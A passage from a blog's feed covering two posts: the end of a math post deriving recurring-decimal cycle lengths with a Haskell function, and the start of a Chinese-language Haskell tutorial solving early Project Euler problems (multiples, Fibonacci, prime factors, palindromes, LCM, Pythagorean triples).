mtight">in</span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>According to the sum formula, we can get</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>0.</mn><mrow><mo fence="true">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo>⋯</mo><msub><mi>a</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mfrac><mrow><msub><mi>a</mi><mn>1</mn></msub><mo>⋯</mo><msub><mi>a</mi><mi>n</mi></msub><mrow><mo fence="true">(</mo><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup><mo>−</mo><munder><mrow><mi>lim</mi><mo>⁡</mo></mrow><mrow><mi>i</mi><mo>→</mo><mo>+</mo><mi mathvariant="normal">∞</mi></mrow></munder><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mi>i</mi><mi>n</mi></mrow></msup><mo fence="true">)</mo></mrow></mrow><mrow><mn>1</mn><mo>−</mo><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup></mrow></mfrac><mspace linebreak="newline"></mspace><mo>=</mo><mfrac><mrow><msub><mi>a</mi><mn>1</mn></msub><mo>⋯</mo><msub><mi>a</mi><mi>n</mi></msub><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><munder><mrow><mi>lim</mi><mo>⁡</mo></mrow><mrow><mi>i</mi><mo>→</mo><mo>+</mo><mi mathvariant="normal">∞</mi></mrow></munder><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mi>i</mi><mi>n</mi></mrow></msup><mo fence="true">)</mo></mrow></mrow><mrow><mn>1</mn><msup><mn>0</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">0.\left( a_1\cdots a_n \right) =\frac{a_1\cdots a_n\left( 10^{-n}-\lim_{i\rightarrow +\infty} 10^{-in} \right)}{1-10^{-n}}\\=\frac{a_1\cdots a_n\left( 1-\lim_{i\rightarrow +\infty} 10^{-in} \right)}{10^n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0.</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3593em;vertical-align:-0.7693em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6973em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7713em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">→</span><span class="mord mtight">+</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">in</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3593em;vertical-align:-0.7693em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">→</span><span class="mord mtight">+</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">in</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>It’s observed that the length of the recurring cycle n is related to, or determined by, the denominator. As long as the denominator can be transformed into the form <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">10^n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7477em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>, it will definitely be a recurring decimal. That is to say, for the fraction <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi mathvariant="normal">/</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">a/b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">b</span></span></span></span>, find a positive integer <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> such that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi mathvariant="normal">∣</mi><mn>1</mn><msup><mn>0</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">b|10^n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mord">∣1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>, then this <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> is the length of the recurring cycle.</p><p>The improved code to avoid integer overflow is as follows:</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Improved version of recurCycle that utilizes an infinite list of numbers composed entirely of 9s to find the cycle length.</span></span><br><span class="line"><span class="title">recurCycleImprove</span> :: <span class="type">Integer</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">recurCycleImprove</span> deno</span><br><span class="line">  | any ((== <span class="number">0</span>) . mod deno) [<span class="number">2</span>, <span class="number">5</span>] = <span class="number">0</span> <span class="comment">-- Returns 0 immediately if deno is a multiple of 2 or 5.</span></span><br><span class="line">  | otherwise = maybe <span class="number">0</span> (+ <span class="number">1</span>) (findIndex ((== <span class="number">0</span>) . (`mod` deno)) all9s) <span class="comment">-- Finds the cycle length using an index in the all9s list.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Generates an infinite list of integers where each integer is composed entirely of 9s.</span></span><br><span class="line"><span class="title">all9s</span> :: [<span class="type">Integer</span>]</span><br><span class="line"><span class="title">all9s</span> = map (\n -&gt; <span class="number">10</span> ^ n - <span class="number">1</span>) [<span class="number">1</span> :: <span class="type">Integer</span> ..]</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.blog-blockchain.xyz/2024/01/cd56c9ab47819ffe8a79fa857256a1ea.png&quot; alt=&quot;image-20240122011802524&quot;&gt;&lt;/p&gt;
&lt;h1&gt;From the Perspective of Cyclic Groups&lt;/h1&gt;
&lt;h2 id=&quot;When-the-Denominator-and-10-are-Coprime&quot;&gt;When the Denominator and 10 are Coprime&lt;/h2&gt;
&lt;p&gt;The process of division is actually the calculation of &lt;span class=&quot;katex&quot;&gt;&lt;span class=&quot;katex-mathml&quot;&gt;&lt;math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;/msup&gt;&lt;mspace&gt;&lt;/mspace&gt;&lt;m</summary>
        
      
    
    
    
    <category term="math" scheme="https://www.blog-blockchain.xyz/categories/math/"/>
    
    
    <category term="math" scheme="https://www.blog-blockchain.xyz/tags/math/"/>
    
  </entry>
  
  <entry>
    <title>Haskell(六) Project Euler 练习1-26</title>
    <link href="https://www.blog-blockchain.xyz/fp/project-euler/"/>
    <id>https://www.blog-blockchain.xyz/fp/project-euler/</id>
    <published>2024-01-14T12:28:03.000Z</published>
    <updated>2024-11-15T14:30:54.923Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/fp/FP-haskell-1/" title="Haskell(一)入门">Haskell(一)入门</a></li><li><a href="/fp/FP-haskell-2/" title="Haskell(二)函数式编程">Haskell(二)函数式编程</a></li><li><a href="/fp/monad/" title="Haskell(三) Monad">Haskell(三) Monad</a></li><li><a href="/fp/Haskell-summary-toolchain/" title="Haskell(四)总结和工具链">Haskell(四)总结和工具链</a></li><li><a href="/fp/Haskell-epilogue/" title="Haskell(五) 总结和展望">Haskell(五) 总结和展望</a></li><li><a href="/fp/project-euler/" title="Haskell(六) Project Euler 练习1-26">Haskell(六) Project Euler 练习1-26</a></li></ol></blockquote><p>本文会选择一些有意思的 <a href="https://projecteuler.net/">Project Euler</a> 的题目，学习怎么用 Haskell 写算法，并且逐渐学习相关语言和数学知识。前 100 题可以直接分享答案，后续的题目就只给暗示和加密的答案，可以发邮件获取解密方式。</p><p>代码仓库：<a href="https://github.com/learnerLj/projecteuler">https://github.com/learnerLj/projecteuler</a></p><h1>P1</h1><p><img src="https://cdn.blog-blockchain.xyz/2024/01/01c147056957bf52eaf6f8843ee69391.png" alt="image-20240114210638244"></p><p>显然 3 和 5 的倍数，其实是 3 和 5 的倍数，去除重复算的 15 的倍数。而且 3 的倍数的和，还可以化简成求和公式。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sumOfMultiples</span> limit = sumDivisible <span class="number">3</span> + sumDivisible <span class="number">5</span> - sumDivisible <span class="number">15</span></span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        cumulativeSum n = n * (n + <span class="number">1</span>) `div` <span class="number">2</span></span><br><span class="line">        sumDivisible n = n * cumulativeSum (limit `div` n)</span><br></pre></td></tr></table></figure><h1>p2 偶数项斐波那契数列</h1><p><a href="https://projecteuler.net/problem=2">https://projecteuler.net/problem=2</a></p><p><img src="https://cdn.blog-blockchain.xyz/2024/01/000e052221c783c485705f832d9afb2a.png" alt="image-20240114210657311"></p><p>偶数项的斐波那契数列，实际上也有递推公式。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sumEvenLessThanImproved</span> :: <span class="type">Integer</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">sumEvenLessThanImproved</span> limit = sum $ takeWhile (&lt; limit) evenFibList</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    evenFibList = <span class="number">2</span> : <span class="number">8</span> : zipWith (\x y -&gt; x + <span class="number">4</span> * y) evenFibn1 evenFibn2</span><br><span class="line">    evenFibn1 = evenFibList</span><br><span class="line">    evenFibn2 = tail evenFibList</span><br></pre></td></tr></table></figure><p>或者先求出来斐波那契数列，然后筛选偶数项也行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sumEvenLessThan :: Integer -&gt; Integer</span><br><span class="line">sumEvenLessThan limit = sum $ filter even $ takeWhile (&lt; limit) fibList</span><br><span class="line">  where</span><br><span class="line">    fibList =</span><br><span class="line">      let fibn1 = fibList</span><br><span class="line">          fibn2 = tail fibList</span><br><span class="line">       in 1 : 2 : zipWith (+) fibn1 fibn2</span><br></pre></td></tr></table></figure><h1>P3 质因数分解</h1><p><a href="https://projecteuler.net/problem=3">https://projecteuler.net/problem=3</a></p><p><img src="https://cdn.blog-blockchain.xyz/2024/01/691c7b4eb0adb0387efa7cacfd5501fa.png" alt="image-20240114210721042"></p><p>质因数分解就先求出来质数，然后再一个一个匹配，看是否是某个数的因数。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">primes</span> :: [<span class="type">Integer</span>]</span><br><span class="line"><span class="title">primes</span> = sieve [<span class="number">2</span>..]</span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">    sieve [] = []</span><br><span class="line">    sieve (p:xs) = p: sieve [x| x&lt;-xs, x `mod` p /=<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="title">primeFactors</span> :: <span class="type">Integer</span> -&gt; [<span class="type">Integer</span>]</span><br><span class="line"><span class="title">primeFactors</span> n =primeFactors&#x27; n primes</span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        primeFactors&#x27; <span class="number">1</span> _ = []</span><br><span class="line">        primeFactors&#x27; _ [] = []</span><br><span class="line">        primeFactors&#x27; m (p:xs)</span><br><span class="line">            | m `mod` p ==<span class="number">0</span> = p: primeFactors&#x27; (divide m p) xs</span><br><span class="line">            | otherwise = primeFactors&#x27; m xs</span><br><span class="line">        divide m p</span><br><span class="line">            | m `mod` p ==<span class="number">0</span> = divide (m `div` p) p</span><br><span class="line">            | otherwise = m</span><br><span class="line"></span><br><span class="line"><span class="title">largestPrimeFactor</span> :: <span class="type">Integer</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">largestPrimeFactor</span> n= last $ primeFactors n</span><br></pre></td></tr></table></figure><h1>P4 回文数的分解</h1><p><img src="https://cdn.blog-blockchain.xyz/2024/01/d0e2ecb9aa4e91dd55c07c4f5d56060f.png" alt="image-20240114210737606"></p><p>这里学习如何用 Haskell 写循环，对于不熟悉的人来说，还是有点挑战的。首先遍历 x 和 y，y 从大到小，如果 y 到达下界，就 x-1，重置 y，直到 x 到达下界返回。</p><p>这里回文数比如整除 11，然后 11 是质数，所以回文数之一必然整除 11，所以每次 y -11。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">isPalindrome</span> :: <span class="type">Int</span> -&gt; <span class="type">Bool</span></span><br><span class="line"><span class="title">isPalindrome</span> n = n == reverseNum n</span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">    reverseNum :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line">    reverseNum = go <span class="number">0</span></span><br><span class="line">        <span class="keyword">where</span></span><br><span class="line">        go acc <span class="number">0</span> = acc</span><br><span class="line">        go acc x = <span class="keyword">let</span> (q, r) = x `quotRem` <span class="number">10</span> <span class="keyword">in</span> go (acc * <span class="number">10</span> + r) q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">largestPalindromeProduct</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">largestPalindromeProduct</span> n = go <span class="number">0</span> upperBound (divisible11 upperBound)</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    lowerBound = <span class="number">10</span> ^ (n - <span class="number">1</span>)</span><br><span class="line">    upperBound = <span class="number">10</span> ^ n - <span class="number">1</span></span><br><span class="line">    go maxPalin x y</span><br><span class="line">      | x &lt; lowerBound = maxPalin</span><br><span class="line">      | y &lt; lowerBound = go maxPalin (x - <span class="number">1</span>) (divisible11 (x-<span class="number">1</span>))</span><br><span class="line">      | isPalindrome currentPalin = go (max maxPalin currentPalin) (x-<span class="number">1</span>) (divisible11 (x-<span class="number">1</span>))</span><br><span class="line">      | otherwise = go maxPalin x (y - <span class="number">11</span>)</span><br><span class="line">      <span class="keyword">where</span> currentPalin = x * y</span><br><span class="line">    divisible11 m = m - m `mod` <span class="number">11</span></span><br></pre></td></tr></table></figure><h1>P5 最小公倍数</h1><p><img src="https://cdn.blog-blockchain.xyz/2024/01/e9fe3be739c16361534e3649cd7441e4.png" alt="image-20240114211157599"></p><p>最小公倍数 x，事实上是覆盖 a 和 b 的质数因子的最小数。比如 6=2*3, 8= 2*2*2，那么最小公倍数要有 3 个 2，1 个 3，也即 2*2*2*3=24。多个数也是一样的。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">lcmRangeImproved</span> :: <span class="type">Integer</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">lcmRangeImproved</span> n = product $ map maxPower primesInRange</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    primesInRange = takeWhile (&lt;= n) primes</span><br><span class="line">    maxPower p = p ^ maxExponent p</span><br><span class="line">    maxExponent p = last $ takeWhile (\x -&gt; p ^ x &lt;= n) [<span class="number">1</span> ..]</span><br><span class="line"><span class="title">primes</span> :: [<span class="type">Integer</span>]</span><br><span class="line"><span class="title">primes</span> = sieve [<span class="number">2</span> ..]</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    sieve [] = []</span><br><span class="line">    sieve (p : xs) = p : sieve [x | x &lt;- xs, x `mod` p /= <span class="number">0</span>]</span><br></pre></td></tr></table></figure><h1>P9 毕达哥拉斯三元组</h1><p><img src="https://cdn.blog-blockchain.xyz/2024/01/3f974072ce9b633bfd04c0af21bc19b1.png" alt="image-20240114211714499"></p><p>毕达哥拉斯三元组，满足特殊代数关系，类似平方和。另外，三元组的倍数仍然是三元组。所以有如下数学推导，三边满足</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>a</mi><mo>=</mo><msup><mi>m</mi><mn>2</mn></msup><mo>−</mo><msup><mi>n</mi><mn>2</mn></msup><mo separator="true">,</mo><mi>b</mi><mo>=</mo><mn>2</mn><mi>m</mi><mi>n</mi><mo separator="true">,</mo><mi>c</mi><mo>=</mo><msup><mi>m</mi><mn>2</mn></msup><mo>+</mo><msup><mi>n</mi><mn>2</mn></msup><mspace linebreak="newline"></mspace><mrow><mi mathvariant="normal">w</mi><mi mathvariant="normal">h</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">e</mi></mrow><mtext> </mtext><mi>m</mi><mo>&gt;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">a=m^2-n^2, b=2mn, c=m^2+n^2\\\mathrm{where}~m&gt;n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9474em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0585em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" 